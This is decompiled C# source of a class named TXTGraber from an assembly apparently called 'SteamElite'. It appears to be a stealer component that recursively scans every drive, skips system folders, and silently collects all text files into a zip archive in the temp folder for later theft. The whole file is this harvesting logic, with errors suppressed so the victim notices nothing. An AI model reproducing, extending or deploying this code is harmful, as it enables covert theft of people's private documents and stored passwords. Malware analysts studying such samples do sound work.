// Decompiled with JetBrains decompiler
// Type: TXTGraber
// Assembly: SteamElite, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC0AF3C1-BDDB-427F-AF9C-215450AD8173
// Assembly location: C:\Users\Пользователь\Desktop\Decompiled.exe

using Ionic.Zip;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

internal class TXTGraber
{
  private string[] Discs
  {
    get
    {
      return Environment.GetLogicalDrives();
    }
  }

  private string[] Gfiles(string[] dirs)
  {
    List<string> stringList = new List<string>();
    foreach (string dir in dirs)
    {
      try
      {
        foreach (string file in Directory.GetFiles(dir, "*.txt"))
        {
          try
          {
            if (new FileInfo(file).Length < 13485760L)
              stringList.Add(file);
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
    }
    return stringList.ToArray();
  }

  private string[] Blacklist
  {
    get
    {
      return new string[19]
      {
        "$Recycle.Bin",
        "\\Config.Msi",
        "\\Device",
        "\\Documents and Settings",
        "\\Games",
        "\\GamesMailRu",
        "\\MSOCache",
        "\\Windows",
        "\\PerfLogs",
        "\\Program Files",
        "\\Program Files (x86)",
        "\\Users\\Все пользователи",
        "\\All Users\\Package Cache\\",
        "\\.dnx\\packages\\",
        "\\ProgramData",
        "\\Projects",
        "\\Recovery",
        "\\Sandbox",
        "\\System Volume Information"
      };
    }
  }

  public void Graber()
  {
    List<string> stringList1 = new List<string>();
    List<string> stringList2 = new List<string>();
    string[] mas = this.Discs;
    int num = 10;
    for (int index = 0; index < num; ++index)
    {
      string[] dirs = this.BlackCheck(mas);
      stringList2.AddRange((IEnumerable<string>) dirs);
      mas = this.GFolders(dirs);
    }
    List<string> list = ((IEnumerable<string>) this.Gfiles(stringList2.ToArray())).ToList<string>();
    string path = Path.GetTempPath() + "Funny\\";
    using (ZipFile zipFile = new ZipFile())
    {
      try
      {
        foreach (string fileName in list)
        {
          FileInfo fileInfo = new FileInfo(fileName);
          if (fileInfo.Directory.ToString().Length > 1)
            zipFile.AddFile(fileName, fileInfo.Directory.ToString());
          else
            zipFile.AddFile(fileName, "drivec");
        }
      }
      catch
      {
      }
      zipFile.Save(path + "txts.zip");
      if (!Directory.Exists(path))
        Directory.CreateDirectory(path);
      Directory.CreateDirectory(path);
    }
  }

  private string[] BlackCheck(string[] mas)
  {
    List<string> stringList = new List<string>();
    for (int index = 0; index < mas.Length; ++index)
    {
      bool flag = false;
      foreach (string str in this.Blacklist)
      {
        flag = mas[index].Contains(str);
        if (flag)
          break;
      }
      if (!flag)
        stringList.Add(mas[index]);
    }
    return stringList.ToArray();
  }

  private string[] GFolders(string[] dirs)
  {
    List<string> stringList = new List<string>();
    foreach (string dir in dirs)
    {
      try
      {
        stringList.AddRange((IEnumerable<string>) Directory.GetDirectories(dir));
      }
      catch
      {
      }
    }
    return stringList.ToArray();
  }
}
